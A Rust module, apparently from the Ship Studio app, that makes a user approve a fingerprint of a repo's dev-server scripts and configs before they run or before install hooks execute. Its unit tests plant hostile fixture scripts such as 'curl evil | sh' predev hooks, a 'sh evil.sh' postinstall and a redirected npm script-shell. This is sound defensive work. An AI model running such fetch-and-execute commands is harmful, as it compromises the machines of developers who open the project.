//! Consent before a project's own commands run as its dev server.
//!
//! Opening a project used to start its dev server at once, which runs
//! whatever the repo says: `package.json` scripts (including `predev` hooks)
//! or a `custom_dev_command` in `.shipstudio/project.json`. Both are
//! repo-controlled, so cloning a repo and opening it was enough to run its
//! code. Now the dev server auto-starts only once the user has approved
//! *what will run*, and asks again when that changes.
//!
//! What is fingerprinted (SHA-256 over a canonical JSON document):
//! - every `scripts` entry of the `package.json` at the project root, and at
//!   the dev-server cwd when a workspace subpath points elsewhere (a monorepo
//!   root's `turbo run dev` and the app's own `dev` both run);
//! - the scripts of **every** workspace the repo declares (`turbo dev` and
//!   `nx` fan out to all of them, not only the one the preview shows);
//! - the project's `custom_dev_command` and `workspace_subpath` (both live in
//!   the shared, repo-controlled `.shipstudio/project.json`);
//! - the contents of the files that run code or redirect what runs, at the
//!   root and the dev-server cwd: framework configs (`vite`, `next`,
//!   `astro`, `nuxt`, `svelte`, `remix`), `.npmrc`, `.yarnrc`, `.yarnrc.yml`
//!   and the file its `yarnPath` names, `.pnpmfile.cjs`, `bunfig.toml`, and
//!   each workspace's Nx `project.json`.
//!
//! Residuals, said plainly: code the dev server imports (a config's own
//! imports, `src/`, `node_modules`) is not fingerprinted, so approval is
//! "trust this project's commands", not a sandbox. Workspace globs are read
//! the way the preview reads them (a literal path or a trailing `/*`).
//!
//! The gate is enforced in Rust: a dev-server spawn names its project, and
//! the PTY layer refuses it unless this exact fingerprint is approved
//! ([`guard_dev_server_spawn`]). Installing dependencies before approval runs
//! no lifecycle scripts ([`plan_package_install`]); once the project is
//! approved, the skipped scripts run before its dev server first starts.
//!
//! Key order inside `scripts` doesn't change what runs, so it doesn't change
//! the fingerprint (keys are sorted). A project with none of these still has
//! a fingerprint (of the empty document): the dev command it falls back to
//! is the package manager's, and asking once for it is cheap and honest.
//! The static-HTML server and Shopify's `shopify theme dev` run no
//! project-defined command and are not gated.
//!
//! Approvals live in the app's own support folder (never the project, which
//! Ship Studio and the repo share), keyed by canonical project path, in a
//! 0600 file. Nothing is grandfathered: a project that was open before this
//! existed asks once on the next launch.

use crate::errors::CommandError;
use crate::types::ProjectMetadata;
use crate::utils::{resolve_workspace_path, validate_project_path};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::sync::Mutex;

/// What would run, as the user is shown it and as it is hashed.
#[derive(Debug, Clone, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DevCommandSurface {
    /// `package.json` scripts at the project root.
    pub scripts: BTreeMap<String, String>,
    /// Scripts at the workspace subpath, when it is a different folder.
    pub workspace_scripts: Option<BTreeMap<String, String>>,
    pub workspace_subpath: Option<String>,
    pub custom_command: Option<String>,
    /// Every declared workspace's scripts, by its folder relative to the root.
    pub workspaces: BTreeMap<String, BTreeMap<String, String>>,
    /// Files that run code or change what runs, by path relative to the
    /// root → SHA-256 of their contents.
    pub files: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum ConsentState {
    Approved,
    /// Never approved here.
    New,
    /// Approved before, and what would run has changed since.
    Changed,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DevServerConsent {
    pub state: ConsentState,
    /// Hand this back to `approve_dev_server`: it approves exactly what was shown.
    pub fingerprint: String,
    pub surface: DevCommandSurface,
    /// Dependencies were installed without their lifecycle scripts (before
    /// approval); they run once the project is approved.
    pub install_scripts_pending: bool,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct ConsentFile {
    #[serde(default)]
    version: u32,
    /// Canonical project path → approved fingerprint.
    #[serde(default)]
    approved: HashMap<String, String>,
    /// Canonical project paths installed with `--ignore-scripts`.
    #[serde(default)]
    install_scripts_skipped: std::collections::BTreeSet<String>,
}

static FILE_LOCK: Mutex<()> = Mutex::new(());

fn consent_path() -> PathBuf {
    crate::brand::app_support_dir().join("dev-server-consent.json")
}

fn read_scripts(dir: &Path) -> BTreeMap<String, String> {
    let Ok(raw) = std::fs::read_to_string(dir.join("package.json")) else {
        return BTreeMap::new();
    };
    let Ok(value) = serde_json::from_str::<Value>(&raw) else {
        // Unparseable: what runs is the package manager's own failure. Hash
        // the raw text so any edit still counts as a change.
        let mut m = BTreeMap::new();
        m.insert("<unparseable package.json>".into(), raw);
        return m;
    };
    value
        .get("scripts")
        .and_then(Value::as_object)
        .map(|scripts| {
            scripts
                .iter()
                .map(|(k, v)| {
                    let text = v
                        .as_str()
                        .map(str::to_string)
                        .unwrap_or_else(|| v.to_string());
                    (k.clone(), text)
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Config files whose contents run code or change what runs.
const CONFIG_STEMS: &[&str] = &[
    "vite.config",
    "next.config",
    "astro.config",
    "nuxt.config",
    "svelte.config",
    "remix.config",
];
const CONFIG_EXTS: &[&str] = &["js", "mjs", "cjs", "ts", "mts", "cts"];
const RC_FILES: &[&str] = &[
    ".npmrc",
    ".yarnrc",
    ".yarnrc.yml",
    ".pnpmfile.cjs",
    "bunfig.toml",
];

fn hash_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

fn rel(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

/// Hash `path` into `files` if it exists (an unreadable file still counts:
/// its presence is part of what runs).
fn add_file(files: &mut BTreeMap<String, String>, root: &Path, path: &Path) {
    if !path.is_file() {
        return;
    }
    let digest = std::fs::read(path)
        .map(|b| hash_hex(&b))
        .unwrap_or_else(|_| "<unreadable>".into());
    files.insert(rel(root, path), digest);
}

/// The file `.yarnrc.yml`'s `yarnPath` names (arbitrary JS that *is* yarn),
/// when it stays inside the project.
fn yarn_path(root: &Path, dir: &Path) -> Option<PathBuf> {
    let raw = std::fs::read_to_string(dir.join(".yarnrc.yml")).ok()?;
    let value = raw.lines().find_map(|l| {
        let l = l.trim();
        l.strip_prefix("yarnPath:")
            .map(|v| v.trim().trim_matches(|c| c == '"' || c == '\'').to_string())
    })?;
    let path = dir.join(value);
    let canon = dunce::canonicalize(&path).ok()?;
    let root = dunce::canonicalize(root).ok()?;
    canon.starts_with(&root).then_some(canon)
}

fn add_dir_files(files: &mut BTreeMap<String, String>, root: &Path, dir: &Path) {
    for stem in CONFIG_STEMS {
        for ext in CONFIG_EXTS {
            add_file(files, root, &dir.join(format!("{stem}.{ext}")));
        }
    }
    for name in RC_FILES {
        add_file(files, root, &dir.join(name));
    }
    if let Some(p) = yarn_path(root, dir) {
        let canon_root = dunce::canonicalize(root).unwrap_or_else(|_| root.to_path_buf());
        add_file(files, &canon_root, &p);
    }
}

fn read_metadata(project: &Path) -> ProjectMetadata {
    std::fs::read_to_string(project.join(".shipstudio").join("project.json"))
        .ok()
        .and_then(|c| serde_json::from_str::<ProjectMetadata>(&c).ok())
        .unwrap_or_default()
}

/// Everything about `project` that decides what its dev server runs.
pub fn surface(project: &Path) -> DevCommandSurface {
    let metadata = read_metadata(project);
    let cwd = resolve_workspace_path(project);
    let workspace_scripts = (cwd != project).then(|| read_scripts(&cwd));
    let mut files = BTreeMap::new();
    add_dir_files(&mut files, project, project);
    if cwd != project {
        add_dir_files(&mut files, project, &cwd);
    }
    let mut workspaces = BTreeMap::new();
    for dir in crate::commands::monorepo::workspace_dirs_at(project) {
        if dir == cwd {
            continue; // already `workspace_scripts`
        }
        add_dir_files(&mut files, project, &dir);
        add_file(&mut files, project, &dir.join("project.json"));
        let scripts = read_scripts(&dir);
        if !scripts.is_empty() {
            workspaces.insert(rel(project, &dir), scripts);
        }
    }
    DevCommandSurface {
        scripts: read_scripts(project),
        workspace_scripts,
        workspace_subpath: metadata.workspace_subpath.filter(|s| !s.is_empty()),
        custom_command: metadata.custom_dev_command.filter(|c| !c.trim().is_empty()),
        workspaces,
        files,
    }
}

/// SHA-256 (hex) of the surface as canonical JSON (sorted keys, versioned).
pub fn fingerprint(surface: &DevCommandSurface) -> String {
    // BTreeMaps serialise in key order; the struct's field order is fixed.
    // v2: workspaces and config/rc files joined the surface, so every
    // project approved under v1 asks once more.
    let doc = serde_json::json!({ "v": 2, "surface": surface });
    hash_hex(doc.to_string().as_bytes())
}

fn read_file(path: &Path) -> ConsentFile {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|c| serde_json::from_str(&c).ok())
        .unwrap_or_default()
}

fn write_file(path: &Path, file: &ConsentFile) -> Result<(), CommandError> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)
            .map_err(|e| CommandError::from(format!("create app support dir: {e}")))?;
    }
    let json = serde_json::to_string_pretty(file)
        .map_err(|e| CommandError::from(format!("serialize dev-server consent: {e}")))?;
    crate::remote_access::write_private(path, json.as_bytes())
        .map_err(|e| CommandError::from(format!("write dev-server consent: {e}")))
}

fn key(project: &Path) -> String {
    project.to_string_lossy().into_owned()
}

/// The verdict for `project` (already canonical) against the store at `store`.
fn consent_at(store: &Path, project: &Path) -> DevServerConsent {
    let surface = surface(project);
    let fingerprint = fingerprint(&surface);
    let file = read_file(store);
    let state = match file.approved.get(&key(project)) {
        Some(f) if *f == fingerprint => ConsentState::Approved,
        Some(_) => ConsentState::Changed,
        None => ConsentState::New,
    };
    DevServerConsent {
        state,
        fingerprint,
        surface,
        install_scripts_pending: file.install_scripts_skipped.contains(&key(project)),
    }
}

/* ------------------------------------------------------ spawn guard */

/// The PTY layer's check before it spawns a dev server for `root` in `cwd`:
/// refused unless what would run is approved right now, and `cwd` is inside
/// `root` (so approving one project can't run another).
pub fn guard_dev_server_spawn(root: &str, cwd: Option<&str>) -> Result<(), String> {
    let project = validate_project_path(root).map_err(|e| e.to_string())?;
    guard_at(&consent_path(), &project, cwd)
}

fn guard_at(store: &Path, project: &Path, cwd: Option<&str>) -> Result<(), String> {
    if let Some(cwd) = cwd {
        let cwd = dunce::canonicalize(cwd).map_err(|e| format!("dev server folder: {e}"))?;
        if !cwd.starts_with(project) {
            return Err(
                "The dev server's folder isn't inside the project it was approved for.".into(),
            );
        }
    }
    match consent_at(store, project).state {
        ConsentState::Approved => Ok(()),
        _ => Err("This project's dev command hasn't been approved (or changed since). Approve it in the Preview first.".into()),
    }
}

/* ---------------------------------------------------------- installs */

/// How to run a dependency install for a project, as decided here rather
/// than by the caller.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallPlan {
    pub args: Vec<String>,
    /// Lifecycle scripts (the project's and its dependencies') will run.
    pub runs_scripts: bool,
}

/// Yarn 2+ ("berry") rejects `--ignore-scripts`; it is told apart by the
/// files only it uses. Classic is the fallback: a wrong guess makes the
/// install fail, never run scripts.
fn is_yarn_berry(project: &Path) -> bool {
    if project.join(".yarnrc.yml").is_file() {
        return true;
    }
    std::fs::read_to_string(project.join("package.json"))
        .ok()
        .and_then(|raw| serde_json::from_str::<Value>(&raw).ok())
        .and_then(|v| v.get("packageManager")?.as_str().map(str::to_string))
        .and_then(|pm| pm.strip_prefix("yarn@").map(str::to_string))
        .and_then(|ver| ver.split('.').next()?.parse::<u32>().ok())
        .is_some_and(|major| major >= 2)
}

fn no_scripts_args(project: &Path, package_manager: &str) -> Vec<String> {
    let extra: &[&str] = match package_manager {
        "yarn" if is_yarn_berry(project) => &["--mode=skip-build"],
        _ => &["--ignore-scripts"],
    };
    std::iter::once("install")
        .chain(extra.iter().copied())
        .map(String::from)
        .collect()
}

/// The command that runs what a scripts-free install skipped.
fn pending_scripts_args(package_manager: &str) -> Vec<String> {
    match package_manager {
        // `rebuild` runs the dependencies' install scripts and the root's
        // (npm: preinstall/install/postinstall; pnpm also `prepare`).
        "npm" | "pnpm" => vec!["rebuild".into()],
        // Yarn and bun run pending builds and root lifecycle on a plain install.
        _ => vec!["install".into()],
    }
}

fn plan_install_at(
    store: &Path,
    project: &Path,
    package_manager: &str,
) -> Result<InstallPlan, CommandError> {
    if consent_at(store, project).state == ConsentState::Approved {
        return Ok(InstallPlan {
            args: vec!["install".into()],
            runs_scripts: true,
        });
    }
    let _guard = FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut file = read_file(store);
    file.version = 1;
    file.install_scripts_skipped.insert(key(project));
    write_file(store, &file)?;
    Ok(InstallPlan {
        args: no_scripts_args(project, package_manager),
        runs_scripts: false,
    })
}

fn pending_scripts_at(store: &Path, project: &Path, package_manager: &str) -> Option<InstallPlan> {
    let c = consent_at(store, project);
    (c.state == ConsentState::Approved && c.install_scripts_pending).then(|| InstallPlan {
        args: pending_scripts_args(package_manager),
        runs_scripts: true,
    })
}

fn mark_scripts_ran_at(store: &Path, project: &Path) -> Result<(), CommandError> {
    if consent_at(store, project).state != ConsentState::Approved {
        return Ok(()); // they didn't run: an unapproved install skips them
    }
    let _guard = FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut file = read_file(store);
    if file.install_scripts_skipped.remove(&key(project)) {
        file.version = 1;
        write_file(store, &file)?;
    }
    Ok(())
}

fn valid_package_manager(pm: &str) -> Result<(), CommandError> {
    match pm {
        "npm" | "pnpm" | "yarn" | "bun" => Ok(()),
        _ => Err(CommandError::Validation {
            field: "package_manager".into(),
            reason: "Unknown package manager".into(),
        }),
    }
}

/// How to install dependencies now: with lifecycle scripts only when the
/// project is approved; otherwise without, remembering that they're owed.
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn plan_package_install(
    project_path: String,
    package_manager: String,
) -> Result<InstallPlan, CommandError> {
    valid_package_manager(&package_manager)?;
    let project = validate_project_path(&project_path)?;
    plan_install_at(&consent_path(), &project, &package_manager)
}

/// The scripts a scripts-free install skipped, once the project is approved.
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn plan_pending_install_scripts(
    project_path: String,
    package_manager: String,
) -> Result<Option<InstallPlan>, CommandError> {
    valid_package_manager(&package_manager)?;
    let project = validate_project_path(&project_path)?;
    Ok(pending_scripts_at(
        &consent_path(),
        &project,
        &package_manager,
    ))
}

/// An install with scripts finished: nothing is owed any more.
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn mark_install_scripts_ran(project_path: String) -> Result<(), CommandError> {
    let project = validate_project_path(&project_path)?;
    mark_scripts_ran_at(&consent_path(), &project)
}

/// Record approval, but only of what is on disk right now: if it changed
/// after the user was shown `shown`, nothing is recorded.
fn approve_at(store: &Path, project: &Path, shown: &str) -> Result<(), CommandError> {
    let _guard = FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let current = fingerprint(&surface(project));
    if current != shown {
        return Err(CommandError::expected(
            "This project's dev command changed again since you were asked. Look it over and approve it once more.",
        ));
    }
    let mut file = read_file(store);
    file.version = 1;
    file.approved.insert(key(project), current);
    write_file(store, &file)
}

/// Tighten the store's permissions if an older build left it readable.
pub fn harden_dev_consent_store() {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = consent_path();
        if let Ok(meta) = std::fs::metadata(&path) {
            if meta.permissions().mode() & 0o077 != 0 {
                let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
            }
        }
    }
}

/// Whether the project's dev server may auto-start, and what would run.
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn get_dev_server_consent(
    project_path: String,
) -> Result<DevServerConsent, CommandError> {
    let project = validate_project_path(&project_path)?;
    Ok(consent_at(&consent_path(), &project))
}

/// The user approved running exactly `fingerprint` (from `get_dev_server_consent`).
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn approve_dev_server(
    project_path: String,
    fingerprint: String,
) -> Result<(), CommandError> {
    let project = validate_project_path(&project_path)?;
    approve_at(&consent_path(), &project, &fingerprint)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project_with(scripts: &str) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            format!(r#"{{ "name": "x", "scripts": {scripts} }}"#),
        )
        .unwrap();
        dir
    }

    #[test]
    fn a_new_project_needs_consent_and_approval_sticks() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, p.path());
        assert_eq!(c.state, ConsentState::New);
        assert_eq!(
            c.surface.scripts.get("dev").map(String::as_str),
            Some("vite")
        );
        approve_at(&store, p.path(), &c.fingerprint).unwrap();
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::Approved);
    }

    #[test]
    fn changed_scripts_ask_again() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, p.path());
        approve_at(&store, p.path(), &c.fingerprint).unwrap();
        std::fs::write(
            p.path().join("package.json"),
            r#"{ "scripts": { "dev": "vite", "predev": "curl evil | sh" } }"#,
        )
        .unwrap();
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::Changed);
    }

    #[test]
    fn reordering_keys_or_editing_other_fields_is_not_a_change() {
        let a = project_with(r#"{ "dev": "vite", "build": "vite build" }"#);
        let b = tempfile::tempdir().unwrap();
        std::fs::write(
            b.path().join("package.json"),
            r#"{ "version": "2.0.0", "scripts": { "build": "vite build", "dev": "vite" }, "dependencies": { "react": "19" } }"#,
        )
        .unwrap();
        assert_eq!(
            fingerprint(&surface(a.path())),
            fingerprint(&surface(b.path()))
        );
    }

    #[test]
    fn the_repo_controlled_custom_command_is_part_of_it() {
        let p = project_with(r#"{ "dev": "vite" }"#);
        let before = fingerprint(&surface(p.path()));
        std::fs::create_dir_all(p.path().join(".shipstudio")).unwrap();
        std::fs::write(
            p.path().join(".shipstudio/project.json"),
            r#"{ "custom_dev_command": "sh ./run.sh" }"#,
        )
        .unwrap();
        let after = surface(p.path());
        assert_eq!(after.custom_command.as_deref(), Some("sh ./run.sh"));
        assert_ne!(before, fingerprint(&after));
    }

    #[test]
    fn a_missing_or_broken_package_json_still_has_a_fingerprint() {
        let empty = tempfile::tempdir().unwrap();
        let s = surface(empty.path());
        assert!(s.scripts.is_empty());
        assert_eq!(fingerprint(&s).len(), 64);

        let broken = tempfile::tempdir().unwrap();
        std::fs::write(broken.path().join("package.json"), "{ nope").unwrap();
        let first = fingerprint(&surface(broken.path()));
        std::fs::write(broken.path().join("package.json"), "{ nope 2").unwrap();
        assert_ne!(first, fingerprint(&surface(broken.path())));
        assert_ne!(first, fingerprint(&s));
    }

    #[test]
    fn approval_of_a_stale_fingerprint_records_nothing() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let shown = consent_at(&store, p.path()).fingerprint;
        std::fs::write(
            p.path().join("package.json"),
            r#"{ "scripts": { "dev": "x" } }"#,
        )
        .unwrap();
        assert!(approve_at(&store, p.path(), &shown).is_err());
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::New);
    }

    #[test]
    fn approvals_are_per_project_and_the_store_is_private() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let a = project_with(r#"{ "dev": "vite" }"#);
        let b = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, a.path());
        approve_at(&store, a.path(), &c.fingerprint).unwrap();
        assert_eq!(consent_at(&store, b.path()).state, ConsentState::New);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&store).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600);
        }
    }

    #[test]
    fn workspace_scripts_count_when_the_subpath_is_elsewhere() {
        let p = project_with(r#"{ "dev": "turbo run dev" }"#);
        std::fs::create_dir_all(p.path().join("apps/web")).unwrap();
        std::fs::write(
            p.path().join("apps/web/package.json"),
            r#"{ "scripts": { "dev": "next dev" } }"#,
        )
        .unwrap();
        std::fs::create_dir_all(p.path().join(".shipstudio")).unwrap();
        std::fs::write(
            p.path().join(".shipstudio/project.json"),
            r#"{ "workspace_subpath": "apps/web" }"#,
        )
        .unwrap();
        let s = surface(p.path());
        assert_eq!(
            s.workspace_scripts
                .as_ref()
                .and_then(|w| w.get("dev"))
                .map(String::as_str),
            Some("next dev")
        );
        let before = fingerprint(&s);
        std::fs::write(
            p.path().join("apps/web/package.json"),
            r#"{ "scripts": { "dev": "next dev && sh x" } }"#,
        )
        .unwrap();
        assert_ne!(before, fingerprint(&surface(p.path())));
    }

    fn store() -> (tempfile::TempDir, PathBuf) {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("consent.json");
        (d, p)
    }

    fn canon(p: &Path) -> PathBuf {
        dunce::canonicalize(p).unwrap()
    }

    #[test]
    fn config_and_rc_files_are_part_of_it() {
        for name in [
            "vite.config.ts",
            "next.config.mjs",
            "astro.config.mjs",
            ".npmrc",
            ".yarnrc.yml",
            ".pnpmfile.cjs",
        ] {
            let p = project_with(r#"{ "dev": "vite" }"#);
            let before = fingerprint(&surface(p.path()));
            std::fs::write(p.path().join(name), "export default {}").unwrap();
            let with = fingerprint(&surface(p.path()));
            assert_ne!(before, with, "{name} appearing is a change");
            std::fs::write(p.path().join(name), "import('child_process')").unwrap();
            assert_ne!(
                with,
                fingerprint(&surface(p.path())),
                "{name} edited is a change"
            );
        }
    }

    #[test]
    fn the_file_yarn_path_names_is_part_of_it() {
        let p = project_with(r#"{ "dev": "vite" }"#);
        std::fs::create_dir_all(p.path().join(".yarn/releases")).unwrap();
        std::fs::write(p.path().join(".yarn/releases/yarn.cjs"), "one").unwrap();
        std::fs::write(
            p.path().join(".yarnrc.yml"),
            "yarnPath: .yarn/releases/yarn.cjs\n",
        )
        .unwrap();
        let before = fingerprint(&surface(p.path()));
        std::fs::write(p.path().join(".yarn/releases/yarn.cjs"), "two").unwrap();
        assert_ne!(before, fingerprint(&surface(p.path())));
    }

    #[test]
    fn every_workspace_counts_not_only_the_previewed_one() {
        let p = project_with(r#"{ "dev": "turbo run dev" }"#);
        std::fs::write(
            p.path().join("package.json"),
            r#"{ "workspaces": ["apps/*", "packages/*"], "scripts": { "dev": "turbo run dev" } }"#,
        )
        .unwrap();
        for (dir, script) in [("apps/web", "next dev"), ("packages/ui", "tsc -w")] {
            std::fs::create_dir_all(p.path().join(dir)).unwrap();
            std::fs::write(
                p.path().join(dir).join("package.json"),
                format!(r#"{{ "scripts": {{ "dev": "{script}" }} }}"#),
            )
            .unwrap();
        }
        let s = surface(p.path());
        assert_eq!(
            s.workspaces
                .get("packages/ui")
                .and_then(|w| w.get("dev"))
                .map(String::as_str),
            Some("tsc -w")
        );
        let before = fingerprint(&s);
        std::fs::write(
            p.path().join("packages/ui/package.json"),
            r#"{ "scripts": { "dev": "tsc -w && curl evil | sh" } }"#,
        )
        .unwrap();
        assert_ne!(before, fingerprint(&surface(p.path())));
        // A config in a workspace that isn't previewed counts too.
        let mid = fingerprint(&surface(p.path()));
        std::fs::write(p.path().join("packages/ui/vite.config.ts"), "x").unwrap();
        assert_ne!(mid, fingerprint(&surface(p.path())));
    }

    #[test]
    fn the_spawn_guard_refuses_until_approved_and_outside_the_project() {
        let (_d, store) = store();
        let p = project_with(r#"{ "dev": "vite" }"#);
        let root = canon(p.path());
        assert!(guard_at(&store, &root, Some(root.to_str().unwrap())).is_err());
        let c = consent_at(&store, &root);
        approve_at(&store, &root, &c.fingerprint).unwrap();
        assert!(guard_at(&store, &root, Some(root.to_str().unwrap())).is_ok());
        // Somewhere else entirely: refused even though this project is approved.
        let other = tempfile::tempdir().unwrap();
        assert!(guard_at(&store, &root, Some(other.path().to_str().unwrap())).is_err());
        // Changed since: refused again.
        std::fs::write(root.join(".npmrc"), "script-shell=/tmp/x").unwrap();
        assert!(guard_at(&store, &root, Some(root.to_str().unwrap())).is_err());
    }

    #[test]
    fn installs_before_approval_skip_scripts_and_owe_them() {
        let (_d, store) = store();
        let p = project_with(r#"{ "dev": "vite", "postinstall": "sh evil.sh" }"#);
        let root = canon(p.path());
        for (pm, flag) in [
            ("npm", "--ignore-scripts"),
            ("pnpm", "--ignore-scripts"),
            ("bun", "--ignore-scripts"),
            ("yarn", "--ignore-scripts"),
        ] {
            let plan = plan_install_at(&store, &root, pm).unwrap();
            assert_eq!(
                plan.args,
                vec!["install".to_string(), flag.to_string()],
                "{pm}"
            );
            assert!(!plan.runs_scripts);
        }
        assert!(consent_at(&store, &root).install_scripts_pending);
        // Nothing is owed until the project is approved.
        assert_eq!(pending_scripts_at(&store, &root, "npm"), None);
        mark_scripts_ran_at(&store, &root).unwrap();
        assert!(
            consent_at(&store, &root).install_scripts_pending,
            "unapproved: still owed"
        );

        let c = consent_at(&store, &root);
        approve_at(&store, &root, &c.fingerprint).unwrap();
        assert_eq!(
            pending_scripts_at(&store, &root, "npm").map(|p| p.args),
            Some(vec!["rebuild".to_string()])
        );
        assert_eq!(
            pending_scripts_at(&store, &root, "bun").map(|p| p.args),
            Some(vec!["install".to_string()])
        );
        mark_scripts_ran_at(&store, &root).unwrap();
        assert_eq!(pending_scripts_at(&store, &root, "npm"), None);
        // Approved: a full install with scripts.
        let plan = plan_install_at(&store, &root, "npm").unwrap();
        assert_eq!(plan.args, vec!["install".to_string()]);
        assert!(plan.runs_scripts);
    }

    #[test]
    fn yarn_berry_gets_its_own_flag() {
        let (_d, store) = store();
        let p = project_with(r#"{ "dev": "vite" }"#);
        let root = canon(p.path());
        std::fs::write(
            root.join("package.json"),
            r#"{ "packageManager": "yarn@4.1.0", "scripts": { "dev": "vite" } }"#,
        )
        .unwrap();
        let plan = plan_install_at(&store, &root, "yarn").unwrap();
        assert_eq!(
            plan.args,
            vec!["install".to_string(), "--mode=skip-build".to_string()]
        );
    }
}
